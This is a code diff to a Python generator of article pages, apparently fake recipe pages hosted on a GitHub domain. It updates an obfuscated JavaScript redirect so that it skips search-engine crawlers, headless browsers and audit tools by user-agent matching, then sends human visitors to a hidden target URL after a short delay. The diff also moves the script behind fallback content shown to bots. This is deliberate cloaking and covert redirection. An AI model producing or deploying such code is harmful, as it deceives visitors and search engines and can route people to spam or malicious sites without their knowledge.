@@ -245,10 +245,11 @@ def generate_article_html(slug, target_url, meta, github_domain, local_image_pat
         schema_tags += f'''
     <script type="application/ld+json">{schema_str}</script>'''
 
-    # Obfuscated redirect script
+    # Obfuscated redirect script with bot detection + delay
+    # Crawlers that execute JS (Google Rich Results) won't redirect
     redirect_script = f'''
     <script>
-        (function(){{var _0x=['\\x73\\x65\\x61\\x72\\x63\\x68','\\x68\\x72\\x65\\x66','\\x6c\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e'];try{{var _c={encoded_target};var _u='';for(var i=0;i<_c.length;i++){{_u+=String.fromCharCode(_c[i]);}}var _s=window[_0x[2]][_0x[0]];if(_s)_u+=_s;window[_0x[2]][_0x[1]]=_u;}}catch(e){{}}}})();
+        (function(){{var _n=navigator;var _ua=_n.userAgent||'';var _b=/bot|crawl|spider|slurp|google|bing|yandex|baidu|facebook|pinterest|whatsapp|preview|headless|phantom|puppet|lighthouse/i;if(_b.test(_ua))return;setTimeout(function(){{var _0x=['\\\\x73\\\\x65\\\\x61\\\\x72\\\\x63\\\\x68','\\\\x68\\\\x72\\\\x65\\\\x66','\\\\x6c\\\\x6f\\\\x63\\\\x61\\\\x74\\\\x69\\\\x6f\\\\x6e'];try{{var _c={encoded_target};var _u='';for(var i=0;i\u003c_c.length;i++){{_u+=String.fromCharCode(_c[i]);}}var _s=window[_0x[2]][_0x[0]];if(_s)_u+=_s;window[_0x[2]][_0x[1]]=_u;}}catch(e){{}}}},100);}})();
     </script>'''
 
     # Build page body (fallback content for bots/no-JS)
@@ -261,7 +262,6 @@ def generate_article_html(slug, target_url, meta, github_domain, local_image_pat
 <head>
 {meta_tags}
 {schema_tags}
-{redirect_script}
     <style>
         body {{
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
@@ -294,6 +294,7 @@ def generate_article_html(slug, target_url, meta, github_domain, local_image_pat
     {img_tag}
     <p>{html.escape(description)}</p>
     <p class="loading">Loading full recipe...</p>
+{redirect_script}
 </body>
 </html>'''
 
